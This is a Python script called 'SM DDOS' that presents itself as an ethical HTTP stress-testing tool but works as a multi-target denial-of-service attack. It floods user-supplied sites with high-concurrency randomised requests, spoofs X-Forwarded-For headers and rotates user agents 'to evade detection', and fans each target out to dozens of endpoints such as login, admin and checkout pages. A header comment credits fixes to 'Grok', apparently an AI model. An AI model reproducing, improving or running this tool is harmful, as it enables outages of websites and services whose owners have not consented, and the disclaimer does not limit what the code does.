#!/usr/bin/env python3
# ----------------------------------------------------------------------------------------------
# SM DDOS - Ultra-Powerful Multi-Target HTTP Stress Testing Tool for Termux/VPS
#
# This tool is designed for ethical stress-testing of HTTP servers to evaluate resilience.
# It sends massive, varied HTTP requests to multiple websites, meant for authorized use only.
# Unauthorized use is prohibited and illegal.
#
# Author: Sifat Mahmud (SM), version 5.2
# Updates: Fixed URL prompt, ultra-high concurrency, massive payloads, gorgeous UI.
# Fixes by Grok: Added aiohttp install handling, enforced request rate with sleep, lowered default concurrency limits to prevent resource exhaustion, removed restrictive SSL settings.
# ----------------------------------------------------------------------------------------------

import asyncio
import random
import sys
import time
import logging
from urllib.parse import urlparse
from statistics import mean
import os
try:
    from termcolor import colored
except ImportError:
    os.system("pip install termcolor")
    from termcolor import colored
import ssl

# Configuration - Lowered defaults for better stability
CONFIG = {
    'max_requests': 10000,     # Total requests (reduced for testing)
    'timeout': 1200,           # Test duration (seconds)
    'batch_size': 500,         # Simultaneous requests (reduced)
    'request_rate': 500,       # Requests per second (reduced)
    'max_retries': 7,          # Retry attempts
    'request_types': ['GET', 'POST', 'HEAD', 'PUT'],
    'log_file': 'ddos_test.log',
    'target_urls': [],         # Filled dynamically
    'payload_size': 10240,     # Max payload (10KB, reduced)
    'connection_limit': 1000   # Max connections (reduced)
}

# Configure logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(CONFIG['log_file']),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Global variables
hosts = []
headers_useragents = []
headers_referers = []
request_counter = 0
successful_requests = 0
failed_requests = 0
response_times = []
status_codes = {}

def useragent_list():
    """Generate a diverse list of User-Agent strings to evade detection."""
    global headers_useragents
    headers_useragents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/127.0.0.0',
        'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
    ]
    return headers_useragents

def referer_list():
    """Generate a list of referer URLs."""
    global headers_referers
    headers_referers = [
        'https://www.google.com/?q=',
        'https://www.bing.com/search?q=',
        'https://search.yahoo.com/search?p=',
        'https://duckduckgo.com/?q=',
        'https://www.facebook.com/',
        'https://www.twitter.com/',
        'https://www.reddit.com/',
        'https://www.linkedin.com/',
        'https://www.instagram.com/',
        'https://www.youtube.com/',
        'https://www.pinterest.com/',
        'https://www.tiktok.com/',
        'https://www.amazon.com/',
        'https://www.wikipedia.org/'
    ]
    return headers_referers

def buildblock(size):
    """Generate a random ASCII string for query parameters or payloads."""
    return ''.join(chr(random.randint(65, 90)) for _ in range(size))

def check_resources():
    """Monitor VPS/Termux CPU and memory usage."""
    try:
        import psutil
        cpu_usage = psutil.cpu_percent(interval=0.1)
        memory = psutil.virtual_memory()
        if cpu_usage > 95:
            logger.warning(f"High CPU usage: {cpu_usage}% - Reducing batch size")
            CONFIG['batch_size'] = max(100, CONFIG['batch_size'] // 2)
        if memory.percent > 95:
            logger.warning(f"High memory usage: {memory.percent}% - Reducing batch size")
            CONFIG['batch_size'] = max(100, CONFIG['batch_size'] // 2)
        return cpu_usage < 95 and memory.percent < 95
    except ImportError:
        logger.warning("psutil not available, skipping resource check")
        return True
    except Exception as e:
        logger.error(f"Resource check failed: {e}")
        return True

async def httpcall(session, target_url, retry=0):
    """Send a varied HTTP request with randomized headers and payloads."""
    global request_counter, successful_requests, failed_requests, response_times, status_codes
    param_joiner = "&" if "?" in target_url else "?"
    target_url = f"{target_url}{param_joiner}{buildblock(random.randint(5, 30))}={buildblock(random.randint(5, 30))}"
    headers = {
        'User-Agent': random.choice(headers_useragents),
        'Accept': random.choice([
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'application/json,text/plain,*/*;q=0.9',
            '*/*'
        ]),
        'Accept-Language': random.choice(['en-US,en;q=0.5', 'en-GB,en;q=0.5', 'fr-FR,fr;q=0.5', 'de-DE,de;q=0.5', 'es-ES,es;q=0.5']),
        'Accept-Encoding': random.choice(['gzip, deflate, br', 'gzip', 'deflate', 'br', 'identity']),
        'Cache-Control': random.choice(['no-cache', 'max-age=0']),
        'Referer': random.choice(headers_referers) + buildblock(random.randint(5, 20)),
        'Connection': 'keep-alive',
        'Host': urlparse(target_url).netloc,
        'Cookie': f'session={buildblock(25)}; user={buildblock(20)}; id={buildblock(15)}; token={buildblock(30)}',
        'X-Forwarded-For': f'{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}',
        'DNT': random.choice(['1', '0']),
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': random.choice(['document', 'image', 'script', 'font']),
        'Sec-Fetch-Mode': random.choice(['navigate', 'same-origin', 'no-cors']),
        'Sec-Fetch-Site': random.choice(['same-origin', 'cross-site']),
        'Sec-Fetch-User': '?1'
    }
    request_type = random.choice(CONFIG['request_types'])
    start_time = time.time()
    try:
        ssl_context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        # Removed custom ciphers to use system defaults for broader compatibility
        if request_type == 'POST':
            data = {'data': buildblock(random.randint(1000, CONFIG['payload_size']))}
            async with session.post(target_url, headers=headers, data=data, timeout=10, ssl=ssl_context) as response:
                status = response.status
        elif request_type == 'PUT':
            data = {'data': buildblock(random.randint(1000, CONFIG['payload_size']))}
            async with session.put(target_url, headers=headers, data=data, timeout=10, ssl=ssl_context) as response:
                status = response.status
        elif request_type == 'HEAD':
            async with session.head(target_url, headers=headers, timeout=10, ssl=ssl_context) as response:
                status = response.status
        else:  # GET
            async with session.get(target_url, headers=headers, timeout=10, ssl=ssl_context) as response:
                status = response.status
        response_time = time.time() - start_time
        response_times.append(response_time)
        successful_requests += 1
        status_codes[status] = status_codes.get(status, 0) + 1
        if status >= 500:
            logger.warning(f"Server returned {status} - possible overload")
        elif status == 429:
            logger.warning("Server rate-limiting detected (429)")
        elif status == 403:
            logger.warning("Server returned 403 - possible Cloudflare/WAF block")
        request_counter += 1
        logger.debug(f"Request {request_counter} to {target_url} succeeded: {status}, Time: {response_time:.3f}s")
        return status
    except aiohttp.ClientError as e:
        logger.error(f"Request to {target_url} failed: {e}")
        failed_requests += 1
        request_counter += 1
        if retry < CONFIG['max_retries']:
            logger.debug(f"Retrying request {request_counter} (Attempt {retry + 1}/{CONFIG['max_retries']})")
            await asyncio.sleep(random.uniform(0.01, 0.3))
            return await httpcall(session, target_url, retry + 1)
        logger.error(f"Request {request_counter} failed after {CONFIG['max_retries']} retries")
        return None

async def run_attack():
    """Run the ultra-powerful DDoS attack with maximum concurrency."""
    global request_counter, successful_requests, failed_requests, response_times
    useragent_list()
    referer_list()
    start_time = time.time()
    print(colored("🚀 Initializing attack...", "cyan"), end="")
    for _ in range(3):
        time.sleep(0.5)
        print(colored(".", "cyan"), end="", flush=True)
    print(colored(" Launched!", "green"))
    
    connector = aiohttp.TCPConnector(limit=CONFIG['connection_limit'], ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=connector) as session:
        while request_counter < CONFIG['max_requests'] and (time.time() - start_time) < CONFIG['timeout']:
            if not check_resources():
                logger.error("Resource limits reached. Adjusting batch size.")
                print(colored("⚠ Resource limits reached. Adjusting batch size.", "yellow"))
            tasks = []
            remaining_requests = CONFIG['max_requests'] - request_counter
            current_batch_size = min(CONFIG['batch_size'], remaining_requests, CONFIG['request_rate'])
            for _ in range(current_batch_size):
                target_url = random.choice(CONFIG['target_urls'])
                tasks.append(httpcall(session, target_url))
            if tasks:
                batch_start = time.time()
                await asyncio.gather(*tasks, return_exceptions=True)
                batch_elapsed = time.time() - batch_start
                rate_interval = current_batch_size / CONFIG['request_rate']
                sleep_time = rate_interval - batch_elapsed
                if sleep_time > 0:
                    await asyncio.sleep(sleep_time)
                logger.info(f"Sent {request_counter} requests (Success: {successful_requests}, Failed: {failed_requests})")
                print(colored(f"🔥 Sent {request_counter} requests (Success: {successful_requests}, Failed: {failed_requests})", "yellow"))
    duration = time.time() - start_time
    success_rate = (successful_requests / request_counter * 100) if request_counter > 0 else 0
    avg_response_time = mean(response_times) if response_times else 0
    logger.info(f"Attack finished: {request_counter} requests sent in {duration:.2f} seconds")
    logger.info(f"Success rate: {success_rate:.2f}% (Successful: {successful_requests}, Failed: {failed_requests})")
    logger.info(f"Average response time: {avg_response_time:.3f} seconds")
    logger.info(f"Status codes: {dict(status_codes)}")
    print(colored(f"\n🏁 Attack finished: {request_counter} requests in {duration:.2f}s", "green"))
    print(colored(f"Success rate: {success_rate:.2f}% (Success: {successful_requests}, Failed: {failed_requests})", "green"))
    print(colored(f"Avg response time: {avg_response_time:.3f}s", "green"))
    print(colored(f"Status codes: {dict(status_codes)}", "green"))

def welcome_message():
    """Display a gorgeous welcome message."""
    print(colored("""
    ╔════════════════════════════════════════════════════╗
    ║       SM DDOS - Ultra-Powerful Stress Testing      ║
    ║                                                    ║
    ║   Author: Sifat Mahmud (SM)                        ║
    ║   For ETHICAL testing of YOUR OWN websites only!    ║
    ║   Unauthorized use is ILLEGAL and prohibited.       ║
    ║   Version 5.2 - Optimized for Termux/VPS           ║
    ║   Date: August 16, 2025                            ║
    ╚════════════════════════════════════════════════════╝
    """, "cyan"))

def get_user_input():
    """Prompt for multiple URLs, request count, and rate with colorized UI."""
    global CONFIG
    print(colored("🌐 Enter target URLs (one per line, press Enter twice to finish):", "magenta"))
    urls = []
    while True:
        url = input(colored("URL (e.g., https://sm5test.rf.gd/SM/sm-bomber.html): ", "blue")).strip()
        if not url:
            if urls:
                break
            else:
                print(colored("❌ At least one URL is required!", "red"))
                continue
        if not url.startswith(('http://', 'https://')):
            url = f'https://{url}'
        if url not in urls:  # Avoid duplicates
            urls.append(url)
    
    try:
        max_requests = input(colored("🔢 Enter total number of requests (default 10000): ", "blue")).strip()
        CONFIG['max_requests'] = int(max_requests) if max_requests else 10000
        request_rate = input(colored("⚡ Enter requests per second (default 500): ", "blue")).strip()
        CONFIG['request_rate'] = int(request_rate) if request_rate else 500
    except ValueError:
        logger.error("Invalid input for max_requests or request_rate. Using defaults.")
        print(colored("⚠ Invalid input. Using defaults: 10000 requests, 500 req/s.", "yellow"))
        CONFIG['max_requests'] = 10000
        CONFIG['request_rate'] = 500
    
    # Generate endpoints for each URL
    for url in urls:
        parsed_url = urlparse(url)
        if not parsed_url.netloc:
            logger.error(f"Invalid URL: {url}")
            print(colored(f"❌ Invalid URL: {url}", "red"))
            continue
        host = parsed_url.netloc
        base_urls = [
            f'https://{host}/',
            f'https://{host}/index.html',
            f'https://{host}/contact.html',
            f'https://{host}/about.html',
            f'https://{host}/login.html',
            f'https://{host}/signup.html',
            f'https://{host}/api/',
            f'https://{host}/test.html',
            f'https://{host}/home.html',
            f'https://{host}/profile.html',
            f'https://{host}/search.html',
            f'https://{host}/blog/',
            f'https://{host}/products.html',
            f'https://{host}/services.html',
            f'https://{host}/dashboard.html',
            f'https://{host}/admin/',
            f'https://{host}/auth/',
            f'https://{host}/config/',
            f'https://{host}/data/',
            f'https://{host}/status.html',
            f'https://{host}/user/',
            f'https://{host}/shop.html',
            f'https://{host}/cart.html',
            f'https://{host}/checkout.html',
            f'https://{host}/faq.html',
            f'https://{host}/terms.html',
            f'https://{host}/privacy.html',
            f'https://{host}/news/',
            f'https://{host}/events/',
            f'https://{host}/support.html',
            f'https://{host}/account.html',
            f'https://{host}/settings.html',
            f'https://{host}/sitemap.xml',
            f'https://{host}/robots.txt',
            f'https://{host}/category/',
            f'https://{host}/forum/',
            f'https://{host}/gallery.html',
            f'https://{host}/downloads/',
            f'https://{host}/updates.html',
            f'https://{host}/info.html'
        ]
        if url not in base_urls:
            base_urls.append(url)
        CONFIG['target_urls'].extend(base_urls)
    return urls

def main():
    """Main function to initialize and run the attack."""
    global hosts
    welcome_message()
    urls = get_user_input()
    if not CONFIG['target_urls']:
        logger.error("No valid URLs provided. Exiting.")
        print(colored("❌ No valid URLs provided. Exiting.", "red"))
        sys.exit(1)
    
    global hosts
    hosts = list(set(urlparse(url).netloc for url in CONFIG['target_urls']))
    logger.info(f"Starting SM DDOS attack on {len(hosts)} hosts with {len(CONFIG['target_urls'])} endpoints")
    print(colored(f"🎯 Targeting {len(hosts)} hosts with {len(CONFIG['target_urls'])} endpoints", "green"))
    try:
        asyncio.run(run_attack())
    except KeyboardInterrupt:
        logger.info("Attack stopped by user")
        print(colored("🛑 Attack stopped by user", "red"))
    except Exception as e:
        logger.error(f"Attack failed: {e}")
        print(colored(f"❌ Attack failed: {e}", "red"))

if __name__ == '__main__':
    try:
        import aiohttp
        import psutil
        import termcolor
    except ImportError as e:
        missing = str(e).split("'")[1]
        print(colored(f"📦 Installing required library: {missing}", "yellow"))
        os.system(f"pip install {missing}")
        if missing == 'aiohttp':
            import aiohttp
        elif missing == 'psutil':
            import psutil
        elif missing == 'termcolor':
            import termcolor
    main()
